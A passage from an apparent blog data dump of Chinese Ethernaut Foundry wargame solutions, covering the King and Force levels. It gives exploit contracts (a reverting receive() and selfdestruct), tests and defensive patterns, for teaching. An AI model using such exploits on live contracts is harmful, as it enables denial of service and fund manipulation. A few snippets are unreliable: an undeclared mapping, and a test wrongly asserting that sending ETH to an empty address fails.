class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/KingFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingAttacker &#123;</span><br><span class=\"line\">    King instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address payable _king) payable &#123;</span><br><span class=\"line\">        instance = King(_king);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public payable &#123;</span><br><span class=\"line\">        (bool success, ) = address(instance).call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 关键：拒绝接收 ETH</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        revert(&quot;I will always be the king!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    KingFactory kingFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        kingFactory = new KingFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(kingFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testKingExploit() public &#123;</span><br><span class=\"line\">        // 创建关卡实例</span><br><span class=\"line\">        address payable levelInstance = payable(ethernaut.createLevelInstance&#123;value: 1 ether&#125;(kingFactory));</span><br><span class=\"line\">        King instance = King(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检查初始状态</span><br><span class=\"line\">        uint256 initialPrize = instance.prize();</span><br><span class=\"line\">        address initialKing = instance._king();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行攻击：成为 king</span><br><span class=\"line\">        attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 尝试有人超越我们（应该失败）</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        (bool success, ) = levelInstance.call&#123;value: initialPrize + 2&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证我们仍然是 king</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 这个关卡无法正常提交，因为我们破坏了游戏机制</span><br><span class=\"line\">        // 但这正是关卡想要演示的攻击效果</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>分析当前 prize</strong>：确定需要多少 ETH 成为 king</li>\n<li><strong>部署攻击合约</strong>：合约的 <code>receive()</code> 函数会 revert</li>\n<li><strong>成为 king</strong>：发送足够的 ETH</li>\n<li><strong>锁定王位</strong>：任何后续尝试都会因为 transfer 失败而回滚</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 部署攻击合约</span><br><span class=\"line\">KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\"></span><br><span class=\"line\">// 发送 ETH 成为 king</span><br><span class=\"line\">attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">// 验证攻击成功</span><br><span class=\"line\">assertEq(instance._king(), address(attacker));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Pull-Payment-模式\"><a href=\"#1-使用-Pull-Payment-模式\" class=\"headerlink\" title=\"1. 使用 Pull Payment 模式\"></a>1. 使用 Pull Payment 模式</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全：Push Payment</span><br><span class=\"line\">contract VulnerableKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        payable(king).transfer(msg.value);  // 可能失败</span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全：Pull Payment</span><br><span class=\"line\">contract SecureKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    mapping(address =&gt; uint) public pendingWithdrawals;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 记录待提取金额</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            pendingWithdrawals[king] += prize;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 让用户自己提取资金</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amount = pendingWithdrawals[msg.sender];</span><br><span class=\"line\">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        pendingWithdrawals[msg.sender] = 0;</span><br><span class=\"line\">        payable(msg.sender).transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-call-并处理失败\"><a href=\"#2-使用-call-并处理失败\" class=\"headerlink\" title=\"2. 使用 call 并处理失败\"></a>2. 使用 call 并处理失败</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ImprovedKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用 call 并处理失败</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            (bool success, ) = payable(king).call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class=\"line\">            if (!success) &#123;</span><br><span class=\"line\">                // 记录失败的支付，让用户手动提取</span><br><span class=\"line\">                pendingWithdrawals[king] += prize;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-实现紧急停止机制\"><a href=\"#3-实现紧急停止机制\" class=\"headerlink\" title=\"3. 实现紧急停止机制\"></a>3. 实现紧急停止机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    bool public paused;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier whenNotPaused() &#123;</span><br><span class=\"line\">        require(!paused);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function pause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unpause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable whenNotPaused &#123;</span><br><span class=\"line\">        // 正常逻辑</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><h3 id=\"DoS-攻击检测\"><a href=\"#DoS-攻击检测\" class=\"headerlink\" title=\"DoS 攻击检测\"></a>DoS 攻击检测</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检测合约是否能接收 ETH</span><br><span class=\"line\">function canReceiveEther(address target) public returns (bool) &#123;</span><br><span class=\"line\">    (bool success, ) = target.call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">    return success;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-限制分析\"><a href=\"#Gas-限制分析\" class=\"headerlink\" title=\"Gas 限制分析\"></a>Gas 限制分析</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 forge 分析 Gas 使用</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 transfer vs call Gas 消耗</span></span><br><span class=\"line\">cast estimate --value 1000000000000000000 &lt;CONTRACT_ADDRESS&gt; <span class=\"string\">&quot;receive()&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>send</code> 和 <code>transfer</code> 现在已被弃用，即使是 <code>call</code>，使用时最好按照检查-效果-交互模式调用</li>\n<li>外部调用必须谨慎使用，必须正确处理错误</li>\n<li>Push Payment 模式容易受到 DoS 攻击</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过拒绝接收 ETH 来破坏支付流程</li>\n<li>利用 <code>transfer</code> 失败时的回滚特性</li>\n<li>成为永久的 king，破坏游戏机制</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>使用 Pull Payment 模式</li>\n<li>正确处理外部调用失败</li>\n<li>实现紧急停止和恢复机制</li>\n<li>避免依赖外部调用的成功</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">上一关: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">下一关: Level 10 - Re-entrancy</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 7: Force - 强制发送以太币攻击","date":"2025-01-25T07:20:00.000Z","updated":"2025-01-25T07:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"学习如何使用 selfdestruct 强制向合约发送以太币，理解合约余额检查的安全隐患。","_content":"\n# 🎯 Ethernaut Level 7: Force - 强制发送以太币攻击\n\n> **关卡链接**: [Ethernaut Level 7 - Force](https://ethernaut.openzeppelin.com/level/7)  \n> **攻击类型**: 强制转账、selfdestruct 利用  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n1. **向合约发送以太币** - 让 `Force` 合约的余额大于 0\n2. **绕过接收限制** - 合约没有 payable 函数或 fallback\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Force {/*\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n*/}\n```\n\n**关键问题**：\n- 合约完全空白，没有任何函数\n- 没有 `payable` 函数或 `fallback/receive` 函数\n- 正常情况下无法接收以太币\n\n### 强制发送以太币的方法\n\n尽管合约拒绝接收以太币，但有几种方法可以强制发送：\n\n1. **selfdestruct()** - 合约自毁时强制转移余额 ⭐\n2. **预计算地址挖矿** - 向未来地址预先发送以太币\n3. **Coinbase 奖励** - 作为矿工奖励接收地址\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// 目标合约 - 完全空白\ncontract Force {\n    // 空合约，无法正常接收以太币\n}\n\ncontract ForceAttacker {\n    constructor() payable {\n        // 构造函数接收以太币\n    }\n    \n    function attack(address payable target) public {\n        // 🎯 关键攻击：使用 selfdestruct 强制发送以太币\n        selfdestruct(target);\n    }\n}\n\ncontract ForceTest is Test {\n    Force public force;\n    ForceAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n\n    function setUp() public {\n        // 部署 Force 合约\n        force = new Force();\n        \n        // 给用户一些以太币\n        vm.deal(user, 10 ether);\n    }\n\n    function testForceExploit() public {\n        console.log(\"=== 攻击前状态 ===\");\n        console.log(\"Force 合约余额:\", address(force).balance);\n        \n        vm.startPrank(user);\n        \n        // 部署攻击合约并发送以太币\n        attacker = new ForceAttacker{value: 1 ether}();\n        \n        console.log(\"攻击合约余额:\", address(attacker).balance);\n        \n        // 🎯 执行攻击：自毁并强制发送以太币\n        attacker.attack(payable(address(force)));\n        \n        vm.stopPrank();\n        \n        console.log(\"=== 攻击后状态 ===\");\n        console.log(\"Force 合约余额:\", address(force).balance);\n        console.log(\"攻击合约余额:\", address(attacker).balance);\n        \n        // 验证攻击成功\n        assertGt(address(force).balance, 0);\n        console.log(\"攻击成功！Force 合约现在有以太币了\");\n    }\n    \n    function testNormalTransferFails() public {\n        vm.startPrank(user);\n        \n        // 尝试正常发送以太币 - 应该失败\n        (bool success,) = address(force).call{value: 1 ether}(\"\");\n        assertFalse(success);\n        \n        console.log(\"正常转账失败，如预期\");\n        assertEq(address(force).balance, 0);\n        \n        vm.stopPrank();\n    }\n    \n    function testPreComputedAddress() public {\n        // 演示预计算地址方法\n        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);\n        \n        vm.startPrank(user);\n        \n        // 向未来地址发送以太币\n        (bool success,) = futureAddress.call{value: 1 ether}(\"\");\n        assertFalse(success); // 地址不存在，发送失败\n        \n        console.log(\"预计算地址:\", futureAddress);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 其他强制发送方法\n\n```solidity\ncontract AlternativeAttacks {\n    // 方法 2: 预计算地址 (实际中很难实现)\n    function preComputedAttack() public payable {\n        // 1. 计算目标合约的未来部署地址\n        // 2. 向该地址发送以太币\n        // 3. 在该地址部署目标合约\n        // 注意：这需要控制部署时机，实际中很困难\n    }\n    \n    // 方法 3: 作为矿工设置 coinbase (仅理论上可能)\n    function coinbaseAttack() public {\n        // 如果你是矿工，可以将目标地址设为 coinbase\n        // 挖矿奖励会直接发送到该地址\n        // 但这需要巨大的算力投入\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免依赖合约余额进行逻辑判断\n\n```solidity\ncontract VulnerableContract {\n    // ❌ 危险：依赖合约余额\n    function withdraw() public {\n        require(address(this).balance == 0, \"Contract must be empty\");\n        // 可被 selfdestruct 攻击绕过\n    }\n}\n\ncontract SafeContract {\n    uint256 private internalBalance;\n    \n    // ✅ 安全：使用内部记账\n    function deposit() public payable {\n        internalBalance += msg.value;\n    }\n    \n    function withdraw() public {\n        require(internalBalance == 0, \"Internal balance must be zero\");\n        // 无法被外部强制修改\n    }\n}\n```\n\n### 2. 使用内部状态变量\n\n```solidity\ncontract SecureForce {\n    uint256 private receivedAmount;\n    \n    receive() external payable {\n        receivedAmount += msg.value;\n    }\n    \n    function getReceivedAmount() public view returns (uint256) {\n        return receivedAmount; // 只计算主动接收的以太币\n    }\n    \n    function getTotalBalance() public view returns (uint256) {\n        return address(this).balance; // 包括强制发送的以太币\n    }\n}\n```\n\n### 3. 检查余额变化\n\n```solidity\ncontract BalanceMonitor {\n    uint256 private lastKnownBalance;\n    \n    modifier balanceCheck() {\n        uint256 balanceBefore = address(this).balance;\n        _;\n        uint256 balanceAfter = address(this).balance;\n        \n        // 检测意外的余额变化\n        if (balanceAfter != lastKnownBalance) {\n            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);\n        }\n        \n        lastKnownBalance = balanceAfter;\n    }\n    \n    event UnexpectedBalanceChange(uint256 expected, uint256 actual);\n}\n```\n\n## 📚 核心知识点\n\n### selfdestruct 机制\n\n```solidity\ncontract SelfDestructExample {\n    constructor() payable {}\n    \n    function destroy(address payable recipient) public {\n        // selfdestruct 会：\n        // 1. 销毁合约代码\n        // 2. 将所有以太币发送给 recipient\n        // 3. 强制发送，无法被阻止\n        selfdestruct(recipient);\n    }\n}\n```\n\n### 合约接收以太币的方式\n\n| 方式 | 可被阻止 | 说明 |\n|------|----------|------|\n| **正常转账** | ✅ 是 | 需要 payable 函数 |\n| **selfdestruct** | ❌ 否 | 强制发送，无法拒绝 |\n| **预计算地址** | ❌ 否 | 发送到未来地址 |\n| **矿工奖励** | ❌ 否 | Coinbase 奖励 |\n\n### 安全编程最佳实践\n\n```solidity\n// ❌ 不安全的模式\ncontract BadPattern {\n    function criticalFunction() public {\n        require(address(this).balance == 0, \"Must be empty\");\n        // 逻辑...\n    }\n}\n\n// ✅ 安全的模式  \ncontract GoodPattern {\n    uint256 private expectedBalance;\n    \n    function criticalFunction() public {\n        require(expectedBalance == 0, \"Expected balance must be zero\");\n        // 逻辑...\n    }\n    \n    function updateExpectedBalance(uint256 amount) private {\n        expectedBalance = amount;\n    }\n}\n```\n\n## 🎯 总结\n\nForce 关卡教导了重要的以太币处理原则：\n\n- ✅ **永远不要依赖 `address(this).balance`** - 可以被强制修改\n- ✅ **使用内部状态跟踪余额** - 更加安全可靠\n- ✅ **理解 selfdestruct 的强制性** - 无法被合约拒绝\n- ✅ **设计时考虑意外资金** - 处理非预期的以太币\n\n这个看似简单的攻击揭示了以太坊虚拟机层面的重要特性。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[下一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-07-force.md","raw":"---\ntitle: 'Ethernaut Level 7: Force - 强制发送以太币攻击'\ndate: 2025-01-25 15:20:00\nupdated: 2025-01-25 15:20:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - selfdestruct\n  - 强制转账\n  - 合约余额\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"学习如何使用 selfdestruct 强制向合约发送以太币，理解合约余额检查的安全隐患。\"\n---\n\n# 🎯 Ethernaut Level 7: Force - 强制发送以太币攻击\n\n> **关卡链接**: [Ethernaut Level 7 - Force](https://ethernaut.openzeppelin.com/level/7)  \n> **攻击类型**: 强制转账、selfdestruct 利用  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n1. **向合约发送以太币** - 让 `Force` 合约的余额大于 0\n2. **绕过接收限制** - 合约没有 payable 函数或 fallback\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Force {/*\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n*/}\n```\n\n**关键问题**：\n- 合约完全空白，没有任何函数\n- 没有 `payable` 函数或 `fallback/receive` 函数\n- 正常情况下无法接收以太币\n\n### 强制发送以太币的方法\n\n尽管合约拒绝接收以太币，但有几种方法可以强制发送：\n\n1. **selfdestruct()** - 合约自毁时强制转移余额 ⭐\n2. **预计算地址挖矿** - 向未来地址预先发送以太币\n3. **Coinbase 奖励** - 作为矿工奖励接收地址\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// 目标合约 - 完全空白\ncontract Force {\n    // 空合约，无法正常接收以太币\n}\n\ncontract ForceAttacker {\n    constructor() payable {\n        // 构造函数接收以太币\n    }\n    \n    function attack(address payable target) public {\n        // 🎯 关键攻击：使用 selfdestruct 强制发送以太币\n        selfdestruct(target);\n    }\n}\n\ncontract ForceTest is Test {\n    Force public force;\n    ForceAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n\n    function setUp() public {\n        // 部署 Force 合约\n        force = new Force();\n        \n        // 给用户一些以太币\n        vm.deal(user, 10 ether);\n    }\n\n    function testForceExploit() public {\n        console.log(\"=== 攻击前状态 ===\");\n        console.log(\"Force 合约余额:\", address(force).balance);\n        \n        vm.startPrank(user);\n        \n        // 部署攻击合约并发送以太币\n        attacker = new ForceAttacker{value: 1 ether}();\n        \n        console.log(\"攻击合约余额:\", address(attacker).balance);\n        \n        // 🎯 执行攻击：自毁并强制发送以太币\n        attacker.attack(payable(address(force)));\n        \n        vm.stopPrank();\n        \n        console.log(\"=== 攻击后状态 ===\");\n        console.log(\"Force 合约余额:\", address(force).balance);\n        console.log(\"攻击合约余额:\", address(attacker).balance);\n        \n        // 验证攻击成功\n        assertGt(address(force).balance, 0);\n        console.log(\"攻击成功！Force 合约现在有以太币了\");\n    }\n    \n    function testNormalTransferFails() public {\n        vm.startPrank(user);\n        \n        // 尝试正常发送以太币 - 应该失败\n        (bool success,) = address(force).call{value: 1 ether}(\"\");\n        assertFalse(success);\n        \n        console.log(\"正常转账失败，如预期\");\n        assertEq(address(force).balance, 0);\n        \n        vm.stopPrank();\n    }\n    \n    function testPreComputedAddress() public {\n        // 演示预计算地址方法\n        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);\n        \n        vm.startPrank(user);\n        \n        // 向未来地址发送以太币\n        (bool success,) = futureAddress.call{value: 1 ether}(\"\");\n        assertFalse(success); // 地址不存在，发送失败\n        \n        console.log(\"预计算地址:\", futureAddress);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 其他强制发送方法\n\n```solidity\ncontract AlternativeAttacks {\n    // 方法 2: 预计算地址 (实际中很难实现)\n    function preComputedAttack() public payable {\n        // 1. 计算目标合约的未来部署地址\n        // 2. 向该地址发送以太币\n        // 3. 在该地址部署目标合约\n        // 注意：这需要控制部署时机，实际中很困难\n    }\n    \n    // 方法 3: 作为矿工设置 coinbase (仅理论上可能)\n    function coinbaseAttack() public {\n        // 如果你是矿工，可以将目标地址设为 coinbase\n        // 挖矿奖励会直接发送到该地址\n        // 但这需要巨大的算力投入\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n### 1. 避免依赖合约余额进行逻辑判断\n\n```solidity\ncontract VulnerableContract {\n    // ❌ 危险：依赖合约余额\n    function withdraw() public {\n        require(address(this).balance == 0, \"Contract must be empty\");\n        // 可被 selfdestruct 攻击绕过\n    }\n}\n\ncontract SafeContract {\n    uint256 private internalBalance;\n    \n    // ✅ 安全：使用内部记账\n    function deposit() public payable {\n        internalBalance += msg.value;\n    }\n    \n    function withdraw() public {\n        require(internalBalance == 0, \"Internal balance must be zero\");\n        // 无法被外部强制修改\n    }\n}\n```\n\n### 2. 使用内部状态变量\n\n```solidity\ncontract SecureForce {\n    uint256 private receivedAmount;\n    \n    receive() external payable {\n        receivedAmount += msg.value;\n    }\n    \n    function getReceivedAmount() public view returns (uint256) {\n        return receivedAmount; // 只计算主动接收的以太币\n    }\n    \n    function getTotalBalance() public view returns (uint256) {\n        return address(this).balance; // 包括强制发送的以太币\n    }\n}\n```\n\n### 3. 检查余额变化\n\n```solidity\ncontract BalanceMonitor {\n    uint256 private lastKnownBalance;\n    \n    modifier balanceCheck() {\n        uint256 balanceBefore = address(this).balance;\n        _;\n        uint256 balanceAfter = address(this).balance;\n        \n        // 检测意外的余额变化\n        if (balanceAfter != lastKnownBalance) {\n            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);\n        }\n        \n        lastKnownBalance = balanceAfter;\n    }\n    \n    event UnexpectedBalanceChange(uint256 expected, uint256 actual);\n}\n```\n\n## 📚 核心知识点\n\n### selfdestruct 机制\n\n```solidity\ncontract SelfDestructExample {\n    constructor() payable {}\n    \n    function destroy(address payable recipient) public {\n        // selfdestruct 会：\n        // 1. 销毁合约代码\n        // 2. 将所有以太币发送给 recipient\n        // 3. 强制发送，无法被阻止\n        selfdestruct(recipient);\n    }\n}\n```\n\n### 合约接收以太币的方式\n\n| 方式 | 可被阻止 | 说明 |\n|------|----------|------|\n| **正常转账** | ✅ 是 | 需要 payable 函数 |\n| **selfdestruct** | ❌ 